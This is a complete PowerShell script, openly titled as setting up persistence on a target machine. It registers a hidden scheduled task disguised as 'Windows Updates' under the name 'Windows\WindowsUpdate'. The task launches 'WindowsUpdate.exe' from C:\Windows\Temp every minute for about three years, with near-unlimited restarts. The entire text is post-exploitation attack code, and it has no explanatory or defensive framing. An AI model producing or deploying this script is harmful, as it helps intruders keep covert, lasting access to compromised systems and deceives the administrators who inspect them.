##POWERSHELL SCRIPT TO SET-UP PERSISTENCE ON A TARGET

echo [+] Creating Task...

#action
$taskAction = New-ScheduledTaskAction `
    -Execute 'WindowsUpdate.exe' `
    -WorkingDirectory "C:\Windows\Temp"

#triggering
$trigger = New-ScheduledTaskTrigger `
    -Daily `
    -At 10:04AM 

$settings = New-ScheduledTaskSettingsSet `
    -Hidden `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RunOnlyIfNetworkAvailable `
    -WakeToRun `
    -RestartCount 99999 `
    -RestartInterval (New-TimeSpan -Minutes 1)

#creation
$task = Register-ScheduledTask `
    -Action $taskAction `
    -Trigger $trigger `
    -TaskName "Windows\WindowsUpdate" `
    -Description "Windows Updates" `
    -Settings $settings

#repetition
$task.Triggers.Repetition.Duration = "P1075D"
$task.Triggers.Repetition.Interval = "PT1M"
$task.Settings.ExecutionTimeLimit= "PT0H"
$task | Set-ScheduledTask

echo [+] Task Created!
